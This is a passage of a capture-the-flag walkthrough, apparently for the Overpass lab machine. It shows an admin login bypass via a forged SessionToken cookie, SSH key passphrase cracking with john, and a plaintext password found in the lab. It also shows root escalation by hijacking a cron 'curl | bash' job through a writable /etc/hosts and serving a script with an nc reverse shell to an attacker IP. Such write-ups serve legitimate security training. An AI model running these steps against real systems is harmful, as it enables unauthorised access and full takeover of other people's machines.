        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

- try to set cookie "SessionToken:anyvalue" in admin page

$ curl http://$IP/admin/ -H "Cookie: SessionToken=anyvalue"
```

- get private key and save as id_rsa
- enter ssh with id_rsa
- username ?? -> try with root, need to find usernames from webpage
- change permission 600 to id_rsa
- need passphrase
- crack with john

```

- decrypt rot47 at cyberchef

[{ "name": "System", "pass": "saydrawnlyingpicture" }]
```

- there is no username System. Try to change user from `/etc/passwd` file
- it is james' password
- try to run linpeas
- Interesting outputs

```
# cronjob
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

- and

```sh
james@overpass-prod:/tmp$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

- can I make a server like this directory and put reverse shell to buildscript.sh in my own server
- change my IP to overpass.thm in /etc/hosts file as it has rw access
- In my machine,

```sh
$ mkdir -p downloads/src/
$ touch downloads/src/buildscript.sh
```

- inside buildscript.sh,

```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.57 4242 >/tmp/f
```

- make a server with python

```sh
python -m http.server 80
```

- listen with nc at 4242
- then change `/etc/hosts` file in victim machine
- original `/etc/hosts` -> `127.0.0.1 overpass.thm`

```
10.11.8.57 overpass.thm
```
